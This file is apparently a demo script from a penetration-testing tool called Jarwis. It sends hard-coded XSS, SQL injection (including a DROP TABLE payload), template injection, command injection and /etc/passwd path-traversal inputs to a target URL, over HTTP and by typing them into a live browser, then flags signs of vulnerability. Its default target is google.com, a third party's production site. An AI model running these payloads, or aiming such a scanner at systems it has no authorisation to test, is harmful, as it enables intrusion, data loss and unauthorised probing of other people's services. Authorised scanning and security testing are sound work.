#!/usr/bin/env python3
"""
Jarwis Quick Input Attack Demo
==============================
A simple script to demonstrate input field attacks in action.

Usage:
    python test_attack_demo.py
    python test_attack_demo.py --url https://example.com
    python test_attack_demo.py --visible  # Opens browser to show attacks
"""

import asyncio
import sys
import os

# Add project root to path (tests/ is one level down from project root)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import print as rprint

console = Console()


async def demo_http_attacks(target_url: str):
    """Demonstrate HTTP-based attacks (no browser)"""
    import aiohttp
    from urllib.parse import quote
    
    console.print(Panel("[bold cyan]HTTP-Based Attack Demo[/bold cyan]"))
    console.print(f"Target: {target_url}\n")
    
    # Test payloads
    payloads = [
        ("XSS", "search", '<script>alert("XSS")</script>'),
        ("XSS", "q", '"><img src=x onerror=alert(1)>'),
        ("SQLi", "id", "' OR '1'='1"),
        ("SQLi", "user", "admin'--"),
        ("SQLi", "id", "1' AND SLEEP(2)--"),
        ("SSTI", "name", "{{7*7}}"),
        ("CMDi", "file", "; ls -la"),
        ("Path", "file", "../../../etc/passwd"),
    ]
    
    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=10),
        headers={'User-Agent': 'Jarwis-Tester/1.0'}
    ) as session:
        
        table = Table(title="Attack Payloads Sent")
        table.add_column("Type", style="cyan")
        table.add_column("Parameter", style="yellow")
        table.add_column("Payload", style="red")
        table.add_column("Status", style="green")
        table.add_column("Response Size", style="blue")
        
        for attack_type, param, payload in payloads:
            try:
                # Build URL with payload
                encoded = quote(payload, safe='')
                test_url = f"{target_url}?{param}={encoded}"
                
                console.print(f"[dim]Testing {attack_type} on {param}...[/dim]")
                
                async with session.get(test_url, ssl=False) as response:
                    body = await response.text()
                    status = response.status
                    
                    # Check for vulnerability indicators
                    vuln_indicator = ""
                    if payload in body:
                        vuln_indicator = " [REFLECTED]"
                    if "SQL syntax" in body or "mysql" in body.lower():
                        vuln_indicator = " [SQL ERROR!]"
                    if "49" in body and "7*7" in payload:
                        vuln_indicator = " [SSTI!]"
                    if "root:" in body:
                        vuln_indicator = " [FILE!]"
                    
                    table.add_row(
                        attack_type,
                        param,
                        payload[:30] + "..." if len(payload) > 30 else payload,
                        f"{status}{vuln_indicator}",
                        f"{len(body)} bytes"
                    )
                    
            except Exception as e:
                table.add_row(attack_type, param, payload[:30], f"ERROR: {e}", "-")
            
            await asyncio.sleep(0.3)
        
        console.print(table)


async def demo_browser_attacks(target_url: str):
    """Demonstrate browser-based attacks (visible in Chromium)"""
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        console.print("[red]Playwright not installed. Run: pip install playwright && playwright install[/red]")
        return
    
    console.print(Panel("[bold magenta]Browser-Visible Attack Demo[/bold magenta]"))
    console.print(f"Target: {target_url}")
    console.print("[yellow]Watch the browser window to see attacks![/yellow]\n")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,  # VISIBLE
            slow_mo=300  # Slow for visibility
        )
        page = await browser.new_page()
        
        # Navigate to target
        console.print(f"[cyan]→ Navigating to {target_url}...[/cyan]")
        await page.goto(target_url, wait_until='networkidle', timeout=30000)
        await asyncio.sleep(1)
        
        # Find input fields
        inputs = await page.query_selector_all('input[type="text"], input[type="search"], input:not([type]), textarea')
        
        if not inputs:
            console.print("[yellow]No text inputs found, trying search box...[/yellow]")
            # Try common selectors
            selectors = ['#search', '[name="q"]', '[name="search"]', '.search-input', 'input[placeholder*="search" i]']
            for sel in selectors:
                inp = await page.query_selector(sel)
                if inp:
                    inputs = [inp]
                    break
        
        if not inputs:
            console.print("[red]No input fields found on page[/red]")
            await browser.close()
            return
        
        console.print(f"[green]Found {len(inputs)} input field(s)[/green]\n")
        
        # Attack payloads to demonstrate
        xss_payloads = [
            '<script>alert("JARWIS")</script>',
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
        ]
        
        sqli_payloads = [
            "' OR '1'='1",
            "admin'--",
            "1; DROP TABLE users--",
        ]
        
        # Handle alert dialogs
        alerts = []
        async def handle_dialog(dialog):
            alerts.append(dialog.message)
            console.print(f"[bold green]⚠ ALERT TRIGGERED: {dialog.message}[/bold green]")
            await dialog.dismiss()
        
        page.on('dialog', handle_dialog)
        
        input_field = inputs[0]
        
        # XSS Attacks
        console.print("[bold red]━━━ XSS Attack Demo ━━━[/bold red]")
        for i, payload in enumerate(xss_payloads):
            console.print(f"\n[cyan]Payload {i+1}: {payload}[/cyan]")
            
            try:
                await input_field.click()
                await page.keyboard.press('Control+A')
                await asyncio.sleep(0.2)
                
                # Type payload visually
                await input_field.type(payload, delay=50)
                await asyncio.sleep(0.5)
                
                # Highlight
                await page.evaluate('''(el) => {
                    el.style.border = '3px solid red';
                    el.style.backgroundColor = '#ffcccc';
                }''', input_field)
                
                await asyncio.sleep(0.5)
                
                # Submit
                await page.keyboard.press('Enter')
                await asyncio.sleep(1.5)
                
                # Check result
                html = await page.content()
                if payload in html:
                    console.print("[green]  → Payload REFLECTED in page![/green]")
                else:
                    console.print("[dim]  → Payload not reflected[/dim]")
                
                # Go back for next test
                await page.go_back()
                await asyncio.sleep(0.5)
                
                # Re-find input
                input_field = await page.query_selector('input[type="text"], input[type="search"], input:not([type]), textarea')
                if not input_field:
                    break
                    
            except Exception as e:
                console.print(f"[red]  Error: {e}[/red]")
        
        # SQLi Attacks
        console.print("\n[bold orange1]━━━ SQL Injection Demo ━━━[/bold orange1]")
        for i, payload in enumerate(sqli_payloads):
            console.print(f"\n[cyan]Payload {i+1}: {payload}[/cyan]")
            
            try:
                input_field = await page.query_selector('input[type="text"], input[type="search"], input:not([type]), textarea')
                if not input_field:
                    break
                
                await input_field.click()
                await page.keyboard.press('Control+A')
                await asyncio.sleep(0.2)
                
                await input_field.type(payload, delay=30)
                await asyncio.sleep(0.3)
                
                await page.evaluate('''(el) => {
                    el.style.border = '3px solid orange';
                    el.style.backgroundColor = '#fff3cd';
                }''', input_field)
                
                await asyncio.sleep(0.5)
                await page.keyboard.press('Enter')
                await asyncio.sleep(1.5)
                
                html = await page.content()
                if any(err in html.lower() for err in ['sql', 'mysql', 'syntax', 'error']):
                    console.print("[green]  → SQL ERROR detected![/green]")
                else:
                    console.print("[dim]  → No SQL error[/dim]")
                
                await page.go_back()
                await asyncio.sleep(0.5)
                
            except Exception as e:
                console.print(f"[red]  Error: {e}[/red]")
        
        # Summary
        console.print("\n" + "="*50)
        if alerts:
            console.print(f"[bold green]✓ XSS Confirmed! {len(alerts)} alert(s) triggered[/bold green]")
        else:
            console.print("[yellow]No XSS alerts triggered[/yellow]")
        
        console.print("\n[dim]Closing browser in 3 seconds...[/dim]")
        await asyncio.sleep(3)
        await browser.close()


async def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Jarwis Attack Demo')
    parser.add_argument('--url', '-u', default='https://www.google.com',
                        help='Target URL (default: https://www.google.com)')
    parser.add_argument('--visible', '-v', action='store_true',
                        help='Run browser-visible attack demo')
    
    args = parser.parse_args()
    
    console.print(Panel.fit(
        "[bold cyan]Jarwis AGI Pen Test[/bold cyan]\n"
        "[bold]Input Field Attack Demo[/bold]",
        border_style="cyan"
    ))
    
    if args.visible:
        await demo_browser_attacks(args.url)
    else:
        await demo_http_attacks(args.url)
    
    console.print("\n[green]Demo complete![/green]")


if __name__ == '__main__':
    asyncio.run(main())
